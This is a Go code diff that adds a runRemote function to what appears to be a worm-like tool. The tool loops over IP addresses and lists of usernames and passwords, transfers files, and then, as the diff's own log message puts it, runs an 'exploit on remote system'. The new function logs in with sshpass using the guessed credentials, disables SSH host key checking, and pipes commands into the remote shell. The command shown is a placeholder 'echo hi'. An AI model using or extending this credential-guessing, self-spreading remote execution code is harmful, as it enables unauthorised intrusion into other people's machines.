@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bytes"
 	"fmt"
 	"io/ioutil"
 	"log"
@@ -35,6 +36,25 @@ func main() {
 
 }
 
+func runRemote(username, password, ip string) {
+	if isVerbose {
+		fmt.Println("Running exploit on remote system: " + username + "@" + ip)
+	}
+	cmd := exec.Command("sshpass", "-p", password, "ssh", "-o", "StrictHostKeyChecking=no", username+"@"+ip)
+	buffer := bytes.Buffer{}
+	buffer.Write([]byte("echo hi > test.txt\n"))
+	cmd.Stdin = &buffer
+	err := cmd.Run()
+
+	// login.Stdout = os.Stdout
+	// login.Stderr = os.Stderr
+
+	// err := login.Run()
+	if err != nil {
+		fmt.Fprintln(os.Stderr, err)
+	}
+}
+
 func transferFiles(ips []string) {
 	for i := 0; i < len(ips); i++ {
 		if isVerbose {
@@ -55,6 +75,7 @@ func transferFiles(ips []string) {
 				if err == nil {
 					if isVerbose {
 						fmt.Println("Files sent")
+						runRemote(usernames[u], passwords[p], ips[i])
 					}
 					complete = true
 					break
